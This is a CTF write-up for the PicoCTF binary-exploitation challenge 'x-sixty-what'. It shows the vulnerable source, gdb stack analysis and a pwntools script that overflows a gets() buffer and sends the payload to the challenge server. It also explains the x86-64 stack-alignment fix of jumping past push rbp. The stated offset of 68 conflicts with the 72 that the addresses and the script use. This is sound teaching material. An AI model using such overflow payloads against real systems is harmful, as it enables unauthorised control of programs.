# PicoCTF - x-sixty-what

## Challenge Overview
**Title:** x-sixty-what  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** vuln.c, vuln

## Description
Overflow x64 code Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this program. Download source. nc saturn.picoctf.net 55261

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```
## Analysis
We have to overflow `buf` inside `vuln()` and override the return address to point to `flag()`.  
Inside `gdb`, I set a breakpoint after `gets()` in `vuln` and observe the stack.  
```
(gdb) b *0x00000000004012cf
Breakpoint 1 at 0x4012cf
(gdb) r
Starting program: /home/giorgos/Downloads/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to 64-bit. Give me a string that gets you the flag: 
AAAAAAA

Breakpoint 1, 0x00000000004012cf in vuln ()
(gdb) x/32x $rbp-64
0x7fffffffd9c0:	0x41414141	0x00414141	0xf7c8867f	0x00007fff
0x7fffffffd9d0:	0x00000006	0x0000009e	0xffffdb58	0x00007fff
0x7fffffffd9e0:	0x00000001	0x00000000	0x00000000	0x00000000
0x7fffffffd9f0:	0x00000000	0x00000000	0xf7ffd000	0x00007fff
0x7fffffffda00:	0xffffda30	0x00007fff	0x00401338	0x00000000
```
**Start of input:** 0x7fffffffd9c0
**Return address:** 0x7fffffffda08
**Distance:** 68
**Address of flag():** 0x000000000040123a

We cant use 0x00 inside our payload since it will stop our input preemptively (null byte), but it doesn't matter since we only need to overflow the first 3 bytes of the address, the 0x401338.

To generate the payload and for further operations, I will use the following Python script
```python
from pwn import *
import sys

def reverse_str(str):
    chunks = [str[i:i+2] for i in range(0, len(str), 2)]

    chunks.reverse()

    hex_bytes = ['\\x' + chunk for chunk in chunks]
    return ''.join(hex_bytes)


def construct_payload(dist, win_addr, encode=False):
    payload = "A" * dist
    payload+=reverse_str(win_addr)
    if encode:
        return payload.encode().decode('unicode_escape').encode('latin1')
    return payload


def send_to_server(payload):
    host = 'saturn.picoctf.net'
    port = 55261
    conn = remote(host, port)
    conn.recvline()
    conn.sendline(payload)
    response = conn.recvall()
    conn.close()
    return response

def get_flag(output):
    index = output.find("picoCTF{")
    result = output[index:]  # substring from pattern to end
    return result


def execute():
    win_addr = "40123a"
    dist=72
    payload = construct_payload(dist, win_addr, True)
    server_output = send_to_server(payload)
    print(get_flag(server_output.decode('utf-8', errors='ignore')))


def generate_payload():
    win_addr = "40123a"
    dist=72
    payload = construct_payload(dist, win_addr)
    print(payload)

def main():
    if(len(sys.argv) <=1):
        print("Please enter operation")
        sys.exit()
    operation=sys.argv[1]
    
    if operation == "payload":
        generate_payload()
    elif operation == "execute":
        execute()
    else:
        print("Invalid operation")
main()
```

The script has two options
- payload - Generates and prints payload as plaintext
- execute - Sends payload to the server

We will use the **payload** option for now  
**Note:** Create a `flag.txt` in the same directory as `vuln` to test it locally
```
â”€$ printf "$(python script.py payload)" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
Flag
[1]    22375 done                              printf "$(python script.py payload)" | 
       22377 segmentation fault (core dumped)  ./vuln
```
And it works.  
Onto the server now.  
The `execute` option of the script now sends te payload to the server and prints the flag
```
$ python script.py execute
[+] Opening connection to saturn.picoctf.net on port 57043: Done
[+] Receiving all data: Done (0B)
[*] Closed connection to saturn.picoctf.net port 57043
```
However no flag...

If we check the reminder of the flag and hint 2
```
Reminder: local exploits may not always work the same way remotely due to differences between machines.
```
64bit x86 enforces `rsp` 16 byte alignment.  
During the prologue of a function **rsp % 16** is expected to be equal to **8**.  
This is because the `call` instruction pushes the return address, 8 bytes, onto the stack
Then `push %rbp` pushes 8 bytes, realigning it to 16.  

However, because we immediately jump to **flag()** without using a `call`, `rsp` remains aligned at the prologue of `flag()` and becomes misaligned after `push %rbp`.

We can verify this using `gdb`
```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/giorgos/Downloads/vuln < <(printf "$(python script.py payload)")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to 64-bit. Give me a string that gets you the flag: 

Breakpoint 1, 0x00000000004012cf in vuln ()
(gdb) ni 2
0x00000000004012d1 in vuln ()
(gdb) disas
Dump of assembler code for function vuln:
...
   0x00000000004012d0 <+30>:	leave
=> 0x00000000004012d1 <+31>:	ret
End of assembler dump.
(gdb) print/x $rsp
$1 = 0x7fffffffda08
```

We examine the value of `rsp` just before the `ret` of `vuln()`.  
We see that it is misaligned by 8 bytes.  
`ret` will pop 8 bytes off the stack which are the return address.  
Now `rsp` will be aligned entering `flag()`.  
```
(gdb) ni
0x000000000040123a in flag ()
(gdb) print/x $rsp
$2 = 0x7fffffffda10
```

Since we don't care about program execution after the flag, we can skip `push rbp` and use the address of the next instruction as our return address leading to correct alignment of `rsp` inside `flag()`

**New return address:** 0x000000000040123b

We change the value of `win_addr` in our script inside `execute()` with `40123b` and rerun the script
```
$ python script.py execute
[+] Opening connection to saturn.picoctf.net on port 60503: Done
[+] Receiving all data: Done (34B)
[*] Closed connection to saturn.picoctf.net port 60503
picoCTF{____REDACTED____}
```

## Solution
- Find distance of `buf` in `vuln()` from the return address
- Override return address with the address of `0x000000000040123b` inside `flag()`